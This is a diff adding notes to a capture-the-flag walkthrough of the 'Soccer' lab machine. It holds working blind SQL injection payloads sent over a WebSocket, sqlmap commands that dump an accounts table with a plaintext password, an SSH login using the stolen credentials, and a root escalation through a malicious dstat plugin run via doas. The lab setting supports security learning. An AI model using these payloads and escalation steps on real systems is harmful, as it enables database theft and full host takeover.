@@ -84,9 +84,213 @@ lrwxrwxrwx 1 root root   34 Nov 17  2022 default -> /etc/nginx/sites-available/d
 lrwxrwxrwx 1 root root   41 Nov 17  2022 soc-player.htb -> /etc/nginx/sites-available/soc-player.htb
 www-data@soccer:/etc/nginx/sites-enabled$ 
 
+┌──(root㉿kali)-[/home/kali]
+└─# echo '10.10.11.194 soc-player.soccer.htb' |tee -a /etc/hosts
+10.10.11.194 soc-player.soccer.htb
+
+looks the same, but we are able to register on this site.
+
+
+we are taken to check and the site is giving us an input and ticket id
+
+GET / HTTP/1.1
+Host: soc-player.soccer.htb:9091
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Sec-WebSocket-Version: 13
+Origin: http://soc-player.soccer.htb
+Sec-WebSocket-Key: 87S+16oRHNToACBxUmbjSA==
+Connection: keep-alive, Upgrade
+Cookie: connect.sid=s%3A4mpgBkgkR3vT5DKsWUVzH7BG-JNM56qy.vOBH20PkwfTyf6E3d6fVmlFmVTdSNSaestyZIEGdywc
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade: websocket
+
+
+we can use burp suite to play with the websocket message.
+but the site {"id":"44 or 1=1"} works just fine. 
+says ticket exists
+
+blind SQLi
+
+what type of DBMS
+
+{"id":"44 or substr((select version()),1,1)='8'"}
+{"id":"44 or substr((select version()),2,1)='.'"}
+{"id":"44 or substr((select version()),3,1)='0'"}
+{"id":"44 or substr((select version()),4,1)='.'"}
+all evaluate to true, typical for MySQL -- 8.0.x
+
+we enumerate the database 
+
+{"id":"44 or substr((select database()),1,1)='s'"}
+This extracts the first character of the current database name (the one the app is connected to).
+
+{"id":"44 or substr((select schema_name from information_schema.schemata limit 1),1,1)='s'"}
+This extracts the first character of the first database name in the list of all databases on the server
+
+
+{"id":"44 or substr((select database()),1,1)='s'"} exists
+{"id":"44 or substr((select database()),2,1)='o'"} exists
+...
+we continue until we get soccer_db as the current connected db
+
+enumerate the tables
+
+{"id":"44 or substr((select table_name from information_schema.tables where table_schema='soccer_db' limit 1),1,1)='a'"} true
+{"id":"44 or substr((select table_name from information_schema.tables where table_schema='soccer_db' limit 1),2,1)='c'"} true
+...
+until we get accounts
+
+
+we increase the limit offset to get the next table
+{"id":"44 or substr((select table_name from information_schema.tables where table_schema='soccer_db' limit 1 offset 1),1,1)='a'"}
+
+
+find first column name
+
+{"id":"44 or substr((select column_name from information_schema.columns where table_name='accounts' and table_schema='soccer_db' limit 1),1,1)='i'"}
+{"id":"44 or substr((select column_name from information_schema.columns where table_name='accounts' and table_schema='soccer_db' limit 1),2,1)='d'"}
+
+next column
+{"id":"44 or substr((select column_name from information_schema.columns where table_name='accounts' and table_schema='soccer_db' limit 1 offset 1),1,1)='e'"}
+{"id":"44 or substr((select column_name from information_schema.columns where table_name='accounts' and table_schema='soccer_db' limit 1 offset 1),2,1)='m'"}
+...
+
+we may also try column names directly
+
+{"id":"44 or (select count(*) from information_schema.columns where table_name='accounts' and table_schema='soccer_db' and column_name='password')>0"}
+true
+
+until we figure an accounts table with id, email, password, and username
+
+extract
+{"id":"44 or substr((select password from accounts limit 1),1,1)='P'"}
+{"id":"44 or substr((select password from accounts limit 1),2,1)='l'"}
+...
+
+1324
+player@player.htb
+player:PlayerOftheMatch2022
+
+
+automated, we could use sqlmap like so
+
+sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --dbs --threads 10 --level 5 --risk 3 --batch
+...
+[02:22:53] [INFO] retrieved: 5
+[02:22:54] [INFO] retrieved: mysql
+[02:22:58] [INFO] retrieved: information_schema
+[02:23:12] [INFO] retrieved: performance_schema
+[02:23:26] [INFO] retrieved: sys
+[02:23:29] [INFO] retrieved: soccer_db
+available databases [5]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] soccer_db
+[*] sys
 
 
 
+┌──(root㉿kali)-[/home/kali]
+└─# sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --threads 10 -D soccer_db --dump --batch
+...
+Database: soccer_db
+Table: accounts
+[1 entry]
++------+-------------------+----------------------+----------+
+| id   | email             | password             | username |
++------+-------------------+----------------------+----------+
+| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
++------+-------------------+----------------------+----------+
+
+
+
+in our www-data shell we can cat /etc/passwd and see player is a user
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh player@10.10.11.194                                                                                  
+...
+player@soccer:~$ 
+
+
+
+player@soccer:~$ find / -perm -u=s -type f 2>/dev/null
+/usr/local/bin/doas
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/bin/umount
+/usr/bin/fusermount
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/at
+/snap/snapd/17883/usr/lib/snapd/snap-confine
+/snap/core20/1695/usr/bin/chfn
+/snap/core20/1695/usr/bin/chsh
+/snap/core20/1695/usr/bin/gpasswd
+/snap/core20/1695/usr/bin/mount
+/snap/core20/1695/usr/bin/newgrp
+/snap/core20/1695/usr/bin/passwd
+/snap/core20/1695/usr/bin/su
+/snap/core20/1695/usr/bin/sudo
+/snap/core20/1695/usr/bin/umount
+/snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1695/usr/lib/openssh/ssh-keysign
+player@soccer:~$ 
+
+
+doas is an alternative to sudo and is less commonly hardened. 
+Check its configuration and version for misconfigurations or known exploits.
+
+The doas configuration file is typically located at /etc/doas.conf on Linux systems 
+and /usr/local/etc/doas.conf on FreeBSD systems.
+
+
+player@soccer:~$ cat /usr/local/etc/doas.conf 
+permit nopass player as root cmd /usr/bin/dstat
+player@soccer:~$ 
+
+
+"Dstat is a tool for generating system resource statistics. Taking a look at its manual shows a handful of
+interesting information, most importantly revealing the possibility of using Python plugins for the tool."
+
+"If we can execute Python code as the root user, we could spawn a shell with the elevated privileges intact.
+Although dstat plugins can only be hosted in certain directories, we have write access to one of them,
+which is /usr/local/share/dstat . This means that we can potentially exploit this access to execute
+arbitrary code as the root user."
+
+
+
+
+player@soccer:~$ echo 'import os; os.system("/bin/bash")' > /usr/local/share/dstat/dstat_nofrickinziti.py
+player@soccer:~$ /usr/local/bin/doas /usr/bin/dstat --nofrickinziti
+/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
+  import imp
+root@soccer:/home/player# id
+uid=0(root) gid=0(root) groups=0(root)
+root@soccer:/home/player# 
+
+
+
+
+
+
+to connect to websocket and run the sqli we also could have done something like intruder or
+for c in {a..z}; do echo "{\"id\":\"44 or substr((select database()),1,1)='$c'\"}"; done | wscat -c ws://soc-player.soccer.htb:9091
 
 
 
